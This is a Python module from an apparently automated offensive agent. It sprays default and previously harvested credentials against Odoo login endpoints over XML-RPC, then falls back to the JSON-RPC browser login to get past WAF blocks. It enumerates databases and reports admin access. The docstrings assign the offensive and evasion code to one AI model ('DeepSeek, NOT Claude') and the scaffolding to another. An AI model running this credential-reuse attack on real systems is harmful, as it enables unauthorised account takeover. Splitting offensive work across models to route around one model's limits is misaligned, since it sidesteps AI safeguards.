# agent_alpha/tools/internal/access/odoo_access.py
"""odoo_access — internal Beta (STRIKE) tool: validate credentials against an
Odoo application over XML-RPC. Phase 4 (Odoo breadth arc, slice 1c), trimmed-internal.

This is the THIRD real access tool. Alongside cred_reuse + default_creds it is what
finally exercises ``ToolRegistry.ranked`` with a genuinely different fingerprint:
Odoo speaks XML-RPC (POST XML to ``/xmlrpc/2/common``/``/xmlrpc/2/db``), NOT an HTML
form login — so it is not a duplicate of default_creds' form-POST body (#6).

Proof model (READ BEFORE EDITING — this is the tier boundary):
  * The ONLY thing this tool proves is a VALID application credential, via a
    NON-DESTRUCTIVE signal: ``authenticate(db, login, password)`` returns an integer
    ``uid`` on success, ``False`` on failure. Reaching the wire is required (anti-#3:
    no proof-theatre), but nothing on the target changes.
  * required_auth = ACTIVE_APPROVED (initial access, not offensive). The run() body
    MUST NOT invoke any state-changing DB-manager action (create / duplicate / backup
    / restore / drop) and MUST NOT attempt the master-password. Those are DESTRUCTIVE,
    they require OFFENSIVE_APPROVED + blast-radius + human approval (Gamma/ANCHOR), and
    they are a SEPARATE slice — building them here would be a false-tier (#3) and would
    cross the Conductor's offensive gate. A `uid` is the ceiling of this tool.

Boundary (model routing, §12.15):
  * Claude owns: name / phase / required_auth / mitre_technique, applies_to(), the
    injected-deps shape, and the ToolResult finding contract below. All non-offensive.
  * Offensive-body author (DeepSeek — K21 lane, NOT Claude) owns: run() — discover the
    database (XML-RPC ``db.list()`` when list_db is on, else the ctx-supplied db),
    apply each candidate credential via ``authenticate``, VERIFY on a real integer uid,
    return CONTENT. NotImplementedError until authored.

Conforms to agent_alpha.tools.contracts.Tool (single canonical contract, #6). Returns
CONTENT, not refs — Beta.step() is the single persistence owner and mints retrievable
refs + REDACTS (scout/Laravel #45 pattern). The raw password is never re-exposed.

run() finding shape (on success):
    {
      "database": str,                 # the Odoo db the credential authenticated against
      "username": str,                 # login that authenticated
      "uid": int,                      # Odoo user id returned by authenticate (> 0)
      "access_level": "user" | "admin",# admin iff uid resolves to an admin group
      "credential_source": "default" | "reused",  # default dict vs Alpha-harvested
      "credential_node_id": str | None,# CREDENTIAL node id when source == "reused" (edge src)
      "proof_request": dict,           # safe fields only: endpoint + method + db + db_source + login
      "proof_response": dict,          # safe fields only: uid + server_version; NO secrets
    }
"""

from __future__ import annotations

import dataclasses
from typing import Any, Protocol, runtime_checkable
from urllib.parse import urlparse

from defusedxml import ElementTree as DefusedET

from agent_alpha.graph.nodes import NodeType
from agent_alpha.tools.contracts import ResourceBudget, TargetContext, ToolResult
from agent_alpha.tools.internal.access.default_credentials import platform_defaults

# ── Single-source markers for THIS tool (defined once; not a #7 dup) ───────
# An Odoo target is the trigger. Mirrors the recon probe's fingerprint vocab
# without importing it (that module is RECON-tier; this is an ACCESS tool).
_ODOO_TECH_MARKERS: tuple[str, ...] = ("odoo",)

# XML-RPC surfaces the offensive body speaks to (data, not logic — single source).
ODOO_XMLRPC_COMMON_PATH = "/xmlrpc/2/common"
ODOO_XMLRPC_DB_PATH = "/xmlrpc/2/db"

# UIDs that are unconditionally admin on default Odoo installs (non-destructive
# heuristic; no write or group-read performed — uid integer is the proof ceiling).
# uid 1 = __import__ / superuser on older installs; uid 2 = canonical admin.
_ODOO_ADMIN_UIDS: frozenset[int] = frozenset({1, 2})

# HTTP statuses that mean the ENDPOINT ITSELF was blocked (WAF/CDN/rate-limit), NOT an
# auth failure — the GAP-067 trigger to fall back to the next transport. A 200 carrying a
# wrong credential or an XML-RPC fault is NOT blocked (the endpoint answered) — no fallback.
_ODOO_BLOCK_STATUSES: frozenset[int] = frozenset({403, 429, 503})


@dataclasses.dataclass(frozen=True)
class OdooLoginResult:
    """Outcome of ONE credential against ONE Odoo transport.

    ``uid`` is a verified Odoo user id (>0) or None. ``blocked`` is True ONLY when the
    transport ENDPOINT was blocked (WAF/CDN/unreachable) — the signal to fall back to the
    next transport; a wrong credential (endpoint answered, uid absent) is blocked=False.
    """

    uid: int | None
    blocked: bool
    requests_used: int


@runtime_checkable
class OdooTransport(Protocol):
    """Validates credentials against an Odoo app over ONE wire protocol.

    GAP-067 fallback seam: XML-RPC (``/xmlrpc/2/*``) is frequently WAF-blocked while the
    web JSON-RPC login (``/web/session/authenticate``) is allowed. OdooAccessTool tries
    transports in order and falls back when one reports ``blocked``. Claude owns this
    protocol + the XML-RPC transport (behaviour-preserving extraction of the existing
    body); the JSON-RPC transport BODY is the offensive/evasion lane (DeepSeek), authored
    separately against this contract.
    """

    name: str  # "xmlrpc" | "json_rpc"
    auth_endpoint: str  # path recorded in the finding's proof_request (distinguishes transport)

    def discover_databases(
        self, base_url: str, max_reqs: int, requests_used: int
    ) -> tuple[list[str], str, bool, int]:
        """Return (db_names, db_source, blocked, requests_used). db_source is
        "enumerated" | "guessed"; blocked=True means try the next transport."""
        ...

    def server_version(
        self, base_url: str, max_reqs: int, requests_used: int
    ) -> tuple[str | None, int]:
        """Non-destructive server version for proof_response (or None)."""
        ...

    def authenticate(
        self, base_url: str, db: str, login: str, password: str, requests_used: int
    ) -> OdooLoginResult:
        """Validate (login, password) against db; verify on a real integer uid (>0)."""
        ...


def _is_odoo(ctx: TargetContext) -> bool:
    """True when the projected tech_stack fingerprints Odoo (asset tech_stack=['odoo']
    from the recon probe → projected into ctx.tech_stack)."""
    tech_blob = " ".join(ctx.tech_stack.values()).lower()
    return any(marker in tech_blob for marker in _ODOO_TECH_MARKERS)


def _odoo_access_already_proven(ctx: TargetContext) -> bool:
    """True when a prior finding already established Odoo access — don't re-auth."""
    return any("odoo" in f.lower() and "uid" in f.lower() for f in ctx.prior_findings)


class OdooAccessTool:
    """Validate application credentials against an Odoo target over XML-RPC."""

    name = "odoo_access"
    phase = "access"
    required_auth = "ACTIVE_APPROVED"
    # Valid Accounts (parent): the credential source is mixed — default Odoo logins
    # AND Alpha-harvested creds — and the novelty is the XML-RPC application surface,
    # not the account *type*. A single technique id for this tool (anti-#7).
    mitre_technique = "T1078"

    def __init__(
        self,
        *,
        http_client: Any = None,
        graph_store: Any = None,
        secrets_manager: Any = None,
        transports: list[OdooTransport] | None = None,
    ) -> None:
        # Injected so run() can reach the wire + resolve reused creds. None is allowed
        # for applies_to()/conformance use; run() requires a real http_client.
        self._http_client = http_client
        self._graph_store = graph_store
        self._secrets_manager = secrets_manager
        # GAP-067 transport fallback chain. None → the default XML-RPC-only chain, built in
        # run() once http_client is validated. The JSON-RPC transport is appended here once
        # its (DeepSeek-authored) body lands — never half-scaffolded as a raising stub (#2).
        self._transports = transports

    def applies_to(self, ctx: TargetContext) -> float:
        """Relevance 0..1 from context — the registry ranks, the agent never guesses
        (K11). High on an Odoo target (this is THE Odoo-specific access vector, ranked
        above the generic default_creds form-POST there); minimal off-Odoo (so on a
        non-Odoo target the registry keeps default_creds/cred_reuse ahead of it);
        near-zero once Odoo access is already proven."""
        if not _is_odoo(ctx):
            return 0.15
        if _odoo_access_already_proven(ctx):
            return 0.1
        return 0.85

    def run(self, ctx: TargetContext, budget: ResourceBudget) -> ToolResult:
        """OFFENSIVE BODY — DeepSeek (K21 lane, NOT Claude).

        Validate application credentials against the Odoo target over XML-RPC:

          1. DISCOVER the database. If ``db.list()`` (POST XML to ODOO_XMLRPC_DB_PATH)
             is enabled, enumerate; otherwise use a ctx-supplied / single db. Never
             assume — an empty/failed list is a failure, not a silent success (#3).
          2. APPLY each candidate credential via ``authenticate(db, login, password)``
             (POST XML to ODOO_XMLRPC_COMMON_PATH). Candidates = built-in Odoo defaults
             (e.g. admin/admin) AND — when graph_store holds CREDENTIAL nodes — creds
             resolved from the vault via secrets_manager.retrieve(). Stay within
             ``budget.max_requests``.
          3. VERIFY on a real integer ``uid`` (> 0). ``False``/``0``/fault → not access.
             This is the ONLY proof; do NOT call any DB-manager create/duplicate/backup/
             restore/drop action and do NOT attempt the master password — those exceed
             required_auth (ACTIVE_APPROVED) and are a separate OFFENSIVE slice.
          4. Return CONTENT per the module-docstring finding shape (raw password NEVER
             returned). Beta.step() persists + mints refs + redacts.

        success=True only on a verified uid; otherwise ToolResult(success=False).
        """
        if self._http_client is None:
            raise ValueError("OdooAccessTool.run requires an injected http_client")

        base_url = ctx.target.rstrip("/")
        candidates = self._assemble_candidates()
        # GAP-067: try each transport in order; fall back to the next when one is BLOCKED
        # (WAF/CDN at the endpoint), NOT when a credential is simply wrong. Default chain is
        # XML-RPC only; JSON-RPC joins it in __init__ once its DeepSeek body lands.
        transports = self._transports or [XmlRpcOdooTransport(self._http_client)]

        requests_used = 0
        any_db_resolved = False
        any_blocked = False
        for transport in transports:
            db_names, db_source, blocked, requests_used = transport.discover_databases(
                base_url, budget.max_requests, requests_used
            )
            if blocked:
                any_blocked = True
                continue  # endpoint blocked at discovery — fall back to the next transport
            if not db_names:
                continue  # reached the endpoint but resolved no database — next transport
            any_db_resolved = True

            server_version, requests_used = transport.server_version(
                base_url, budget.max_requests, requests_used
            )

            transport_blocked = False
            for db_name in db_names:
                if transport_blocked:
                    break
                for username, password, cred_source, cred_node_id in candidates:
                    if requests_used >= budget.max_requests:
                        break
                    result = transport.authenticate(
                        base_url, db_name, username, password, requests_used
                    )
                    requests_used = result.requests_used
                    if result.blocked:
                        any_blocked = True
                        transport_blocked = True  # endpoint blocked mid-loop → next transport
                        break
                    if result.uid is None:
                        continue  # wrong credential — try the next candidate
                    access_level = "admin" if result.uid in _ODOO_ADMIN_UIDS else "user"
                    return ToolResult(
                        tool=self.name,
                        success=True,
                        confidence=0.9,
                        findings=(
                            self._build_finding(
                                db_name,
                                username,
                                result.uid,
                                access_level,
                                cred_source,
                                cred_node_id,
                                server_version,
                                db_source,
                                transport.auth_endpoint,
                            ),
                        ),
                    )

            # A reachable auth failure is only terminal when this transport resolved the
            # database authoritatively ("enumerated"). XML-RPC can fall back to a
            # hostname-derived guess, and a wrong guessed db must not suppress later
            # transports that may discover/enumerate the real database.
            if not transport_blocked and db_source == "enumerated":
                break

        if not any_db_resolved:
            reason = (
                "all Odoo transports blocked before a database could be resolved"
                if any_blocked
                else "could not discover any Odoo database name"
            )
            return ToolResult(tool=self.name, success=False, confidence=0.0, error=reason)
        return ToolResult(
            tool=self.name,
            success=False,
            confidence=0.0,
            error="no candidate credential authenticated on any Odoo transport",
        )

    def _assemble_candidates(self) -> list[tuple[str, str, str, str | None]]:
        """Build credential candidate list: Odoo defaults + harvested graph creds.

        Odoo defaults come from the SINGLE-source catalog (default_credentials.yaml,
        ``odoo`` platform entry) — NOT an inline literal (anti-#7; the pairs used to be
        orphaned here, diverged from default_creds' catalog)."""
        candidates: list[tuple[str, str, str, str | None]] = [
            (username, password, "default", None)
            for username, password in platform_defaults("odoo")
        ]

        if self._graph_store is None or self._secrets_manager is None:
            return candidates

        try:
            cred_nodes = self._graph_store.nodes_by_type(NodeType.CREDENTIAL)
            for node in cred_nodes:
                props = node.properties
                if not hasattr(props, "secret_ref") or not hasattr(props, "username"):
                    continue
                if not props.username:
                    # Keyless secrets (js_secret / config KEY-branch mint username="")
                    # can NEVER authenticate to Odoo — skip, don't waste an auth request.
                    continue
                try:
                    secret = self._secrets_manager.retrieve(props.secret_ref)
                except Exception:
                    continue
                candidates.append((props.username, secret, "reused", node.id))
        except Exception:
            pass

        return candidates

    @staticmethod
    def _build_finding(
        db_name: str,
        username: str,
        uid: int,
        access_level: str,
        cred_source: str,
        cred_node_id: str | None,
        server_version: str | None,
        db_source: str,
        auth_endpoint: str,
    ) -> dict[str, Any]:
        """Build the finding dict — raw password intentionally absent.

        ``database_source`` ("enumerated" | "guessed") rides INSIDE proof_request so it
        survives Beta.step persistence (which forwards proof_request verbatim); a
        top-level finding field would be dropped by the cherry-picking persister (#2).
        """
        return {
            "database": db_name,
            "username": username,
            "uid": uid,
            "access_level": access_level,
            "credential_source": cred_source,
            "credential_node_id": cred_node_id,
            "proof_request": {
                "endpoint": auth_endpoint,
                "method": "authenticate",
                "database": db_name,
                "database_source": db_source,
                "login": username,
            },
            "proof_response": {
                "uid": uid,
                "server_version": server_version,
            },
        }


# ── XML-RPC helpers (data, not logic — single source for this tool) ───────


def _build_xmlrpc_request(method: str, params: list[Any]) -> str:
    """Build an XML-RPC methodCall string."""
    param_xml = _params_to_xml(params)
    return (
        '<?xml version="1.0"?>'
        "<methodCall>"
        f"<methodName>{method}</methodName>"
        f"<params>{param_xml}</params>"
        "</methodCall>"
    )


def _params_to_xml(params: list[Any]) -> str:
    parts = []
    for p in params:
        parts.append(f"<param>{_value_to_xml(p)}</param>")
    return "".join(parts)


def _value_to_xml(val: Any) -> str:
    if isinstance(val, bool):
        return f"<value><boolean>{1 if val else 0}</boolean></value>"
    if isinstance(val, int):
        return f"<value><int>{val}</int></value>"
    if isinstance(val, float):
        return f"<value><double>{val}</double></value>"
    if isinstance(val, str):
        return f"<value><string>{val}</string></value>"
    if isinstance(val, (list, tuple)):
        items = "".join(_value_to_xml(v) for v in val)
        return f"<value><array><data>{items}</data></array></value>"
    if isinstance(val, dict):
        members = "".join(
            f"<member><name>{k}</name>{_value_to_xml(v)}</member>" for k, v in val.items()
        )
        return f"<value><struct>{members}</struct></value>"
    return "<value><string></string></value>"


def _parse_xmlrpc_response(body: str) -> Any:
    """Parse an XML-RPC methodResponse body. Returns the value, or None on fault/error."""
    try:
        root = DefusedET.fromstring(body)
    except DefusedET.ParseError:
        return None

    fault = root.find(".//fault")
    if fault is not None:
        return None

    param = root.find(".//params/param/value")
    if param is None:
        return None

    return _xml_to_value(param)


def _xml_to_value(elem: DefusedET.Element) -> Any:
    """Recursively convert an XML-RPC value element to a Python object."""
    # Check for typed value
    child = elem[0] if len(elem) > 0 else None

    if child is not None:
        tag = child.tag.lower()

        if tag == "int" or tag == "i4":
            try:
                return int(child.text or "0")
            except ValueError:
                return 0

        if tag == "boolean":
            return (child.text or "0").strip() == "1"

        if tag == "double":
            try:
                return float(child.text or "0.0")
            except ValueError:
                return 0.0

        if tag == "string":
            return child.text or ""

        if tag == "array":
            data = child.find("data")
            if data is None:
                return []
            return [_xml_to_value(v) for v in data.findall("value")]

        if tag == "struct":
            result: dict[str, Any] = {}
            for member in child.findall("member"):
                name_elem = member.find("name")
                value_elem = member.find("value")
                if name_elem is not None and value_elem is not None:
                    result[name_elem.text or ""] = _xml_to_value(value_elem)
            return result

    # Untyped value — try int, then string
    text = elem.text or ""
    try:
        return int(text)
    except ValueError:
        return text


# ── Transports (GAP-067 fallback chain) ───────────────────────────────────


class XmlRpcOdooTransport:
    """Validate Odoo credentials over XML-RPC (``/xmlrpc/2/*``).

    Behaviour-preserving EXTRACTION of OdooAccessTool's original inline XML-RPC body
    (Claude lane, non-offensive) into the OdooTransport seam, PLUS the ``blocked`` signal:
    a WAF/CDN block status on the endpoint (403/429/503) now reports ``blocked`` so the
    tool falls back to another transport, instead of being indistinguishable from a wrong
    credential. A 200 (even an XML-RPC fault) is NOT blocked — the endpoint answered.
    """

    name = "xmlrpc"
    auth_endpoint = ODOO_XMLRPC_COMMON_PATH

    def __init__(self, http_client: Any) -> None:
        self._http = http_client

    def discover_databases(
        self, base_url: str, max_reqs: int, requests_used: int
    ) -> tuple[list[str], str, bool, int]:
        """db.list() over XML-RPC, with host-label fallback + provenance (anti-#3 honesty).

        "enumerated" when db.list() returned names; "guessed" when we fell back to the
        hostname label. A 403/429/503 at the endpoint returns blocked=True (no guess) so
        the tool falls back; any other outcome keeps the resilient hostname fallback.
        """
        host = urlparse(base_url).hostname or base_url
        db_names: list[str] = []
        db_source = "enumerated"
        if requests_used < max_reqs:
            try:
                resp = self._http.post(
                    f"{base_url}{ODOO_XMLRPC_DB_PATH}",
                    data=_build_xmlrpc_request("list", []),
                    headers={"Content-Type": "text/xml"},
                )
                requests_used += 1
                status = getattr(resp, "status_code", 0)
                if status in _ODOO_BLOCK_STATUSES:
                    return [], "", True, requests_used  # WAF-blocked → fall back, do not guess
                if status == 200:
                    parsed = _parse_xmlrpc_response(getattr(resp, "text", ""))
                    if isinstance(parsed, list):
                        db_names = [str(d) for d in parsed if str(d)]
            except Exception:  # noqa: BLE001 — unreachable/parse error → resilient host fallback
                pass

        if not db_names:
            db_source = "guessed"
            derived = host.split(".")[0] if host else ""
            if derived:
                db_names = [derived]

        return db_names, db_source, False, requests_used

    def server_version(
        self, base_url: str, max_reqs: int, requests_used: int
    ) -> tuple[str | None, int]:
        """Fetch Odoo server version via XML-RPC (non-destructive, for proof_response)."""
        if requests_used + 2 > max_reqs:
            return None, requests_used
        try:
            resp = self._http.post(
                f"{base_url}{ODOO_XMLRPC_COMMON_PATH}",
                data=_build_xmlrpc_request("version", []),
                headers={"Content-Type": "text/xml"},
            )
            requests_used += 1
            if getattr(resp, "status_code", 0) == 200:
                parsed = _parse_xmlrpc_response(getattr(resp, "text", ""))
                if isinstance(parsed, dict):
                    return parsed.get("server_version"), requests_used
        except Exception:  # noqa: BLE001 — version is best-effort proof; never fatal
            pass
        return None, requests_used

    def authenticate(
        self, base_url: str, db: str, login: str, password: str, requests_used: int
    ) -> OdooLoginResult:
        """One XML-RPC ``authenticate(db, login, password)`` — verify on a real uid (>0).

        A 403/429/503 (or an unreachable endpoint) reports blocked=True so the tool falls
        back to the next transport. A 200 that yields no positive uid is a wrong credential
        (blocked=False) — keep trying candidates on THIS transport.
        """
        auth_url = f"{base_url}{ODOO_XMLRPC_COMMON_PATH}"
        try:
            resp = self._http.post(
                auth_url,
                data=_build_xmlrpc_request("authenticate", [db, login, password, {}]),
                headers={"Content-Type": "text/xml"},
            )
            requests_used += 1
        except Exception:  # noqa: BLE001 — endpoint unreachable = a transport-level block
            return OdooLoginResult(uid=None, blocked=True, requests_used=requests_used)

        status = getattr(resp, "status_code", 0)
        if status in _ODOO_BLOCK_STATUSES:
            return OdooLoginResult(uid=None, blocked=True, requests_used=requests_used)
        if status != 200:
            return OdooLoginResult(uid=None, blocked=False, requests_used=requests_used)

        uid = _parse_xmlrpc_response(getattr(resp, "text", ""))
        if not isinstance(uid, int) or uid <= 0:
            return OdooLoginResult(uid=None, blocked=False, requests_used=requests_used)
        return OdooLoginResult(uid=uid, blocked=False, requests_used=requests_used)


class JsonRpcOdooTransport:
    """Validate Odoo credentials over Odoo's web JSON-RPC login (``/web/session/authenticate``).

    GAP-067 fallback body: when the XML-RPC endpoint (``/xmlrpc/2/*``) is WAF/CDN-blocked
    (403/429/503), ``OdooAccessTool.run()`` falls back to this transport. Odoo's web login
    speaks JSON-RPC 2.0 over ``/web/session/authenticate`` — a path that is typically
    allowed by CDN/WAF rules because it is the normal browser login.

    Wire contract mirrors ``XmlRpcOdooTransport`` exactly (blocked semantics, budget
    discipline, uid-only proof ceiling). The JSON-RPC envelope is
    ``{"jsonrpc":"2.0","method":"call","params":{...}}``.

    Proof model: uid (>0) is the ceiling. No DB-manager actions, no master-password
    (those are OFFENSIVE_APPROVED / Gamma, STOP-gated). The raw password is NEVER
    returned anywhere (anti-#3).
    """

    name = "json_rpc"
    auth_endpoint = "/web/session/authenticate"

    # JSON-RPC endpoints on the Odoo web tier.
    _DB_LIST_PATH = "/web/database/list"
    _VERSION_PATH = "/web/webclient/version_info"
    _AUTH_PATH = "/web/session/authenticate"

    def __init__(self, http_client: Any) -> None:
        self._http = http_client

    def discover_databases(
        self, base_url: str, max_reqs: int, requests_used: int
    ) -> tuple[list[str], str, bool, int]:
        """Enumerate databases via JSON-RPC ``/web/database/list``.

        "enumerated" when the endpoint returned a db list; "guessed" when we fell back to
        the hostname label (identical to ``XmlRpcOdooTransport``'s resilient fallback).
        A 403/429/503 returns ``blocked=True`` so the tool skips this transport entirely.
        """
        host = urlparse(base_url).hostname or base_url
        db_names: list[str] = []
        db_source = "enumerated"
        if requests_used < max_reqs:
            try:
                resp = self._http.post(
                    f"{base_url}{self._DB_LIST_PATH}",
                    json_body={"jsonrpc": "2.0", "method": "call", "params": {}},
                    headers={"Content-Type": "application/json"},
                )
                requests_used += 1
                status = getattr(resp, "status_code", 0)
                if status in _ODOO_BLOCK_STATUSES:
                    return [], "", True, requests_used  # WAF-blocked → fall back
                if status == 200:
                    parsed = _safe_json_result(getattr(resp, "text", ""))
                    if isinstance(parsed, list):
                        db_names = [str(d) for d in parsed if str(d)]
            except Exception:  # noqa: BLE001 — unreachable/parse error → resilient host fallback
                pass

        if not db_names:
            db_source = "guessed"
            derived = host.split(".")[0] if host else ""
            if derived:
                db_names = [derived]

        return db_names, db_source, False, requests_used

    def server_version(
        self, base_url: str, max_reqs: int, requests_used: int
    ) -> tuple[str | None, int]:
        """Best-effort Odoo version via JSON-RPC ``/web/webclient/version_info``."""
        if requests_used + 2 > max_reqs:
            return None, requests_used
        try:
            resp = self._http.post(
                f"{base_url}{self._VERSION_PATH}",
                json_body={"jsonrpc": "2.0", "method": "call", "params": {}},
                headers={"Content-Type": "application/json"},
            )
            requests_used += 1
            if getattr(resp, "status_code", 0) == 200:
                parsed = _safe_json_result(getattr(resp, "text", ""))
                if isinstance(parsed, dict):
                    return parsed.get("server_version"), requests_used
        except Exception:  # noqa: BLE001 — version is best-effort proof; never fatal
            pass
        return None, requests_used

    def authenticate(
        self, base_url: str, db: str, login: str, password: str, requests_used: int
    ) -> OdooLoginResult:
        """One JSON-RPC ``/web/session/authenticate`` — verify on a real uid (>0).

        A 403/429/503 (or an unreachable endpoint) reports ``blocked=True`` so the tool
        falls back to the next transport. A 200 that yields no positive uid is a wrong
        credential (``blocked=False``) — keep trying candidates on THIS transport.
        """
        auth_url = f"{base_url}{self._AUTH_PATH}"
        try:
            resp = self._http.post(
                auth_url,
                json_body={
                    "jsonrpc": "2.0",
                    "method": "call",
                    "params": {"db": db, "login": login, "password": password},
                },
                headers={"Content-Type": "application/json"},
            )
            requests_used += 1
        except Exception:  # noqa: BLE001 — endpoint unreachable = a transport-level block
            return OdooLoginResult(uid=None, blocked=True, requests_used=requests_used)

        status = getattr(resp, "status_code", 0)
        if status in _ODOO_BLOCK_STATUSES:
            return OdooLoginResult(uid=None, blocked=True, requests_used=requests_used)
        if status != 200:
            return OdooLoginResult(uid=None, blocked=False, requests_used=requests_used)

        parsed = _safe_json_result(getattr(resp, "text", ""))
        if isinstance(parsed, dict):
            uid = parsed.get("uid")
            if isinstance(uid, int) and uid > 0:
                return OdooLoginResult(uid=uid, blocked=False, requests_used=requests_used)
        elif isinstance(parsed, int) and parsed > 0:
            # Some Odoo versions return uid directly as the result value.
            return OdooLoginResult(uid=parsed, blocked=False, requests_used=requests_used)

        return OdooLoginResult(uid=None, blocked=False, requests_used=requests_used)


def _safe_json_result(text: str) -> Any:
    """Extract the ``result`` field from a JSON-RPC 2.0 response body.

    Returns ``None`` on any parse error or missing ``result`` key — never raises.
    """
    import json as _json

    try:
        body = _json.loads(text)
    except (ValueError, TypeError):
        return None
    if isinstance(body, dict):
        return body.get("result")
    return None

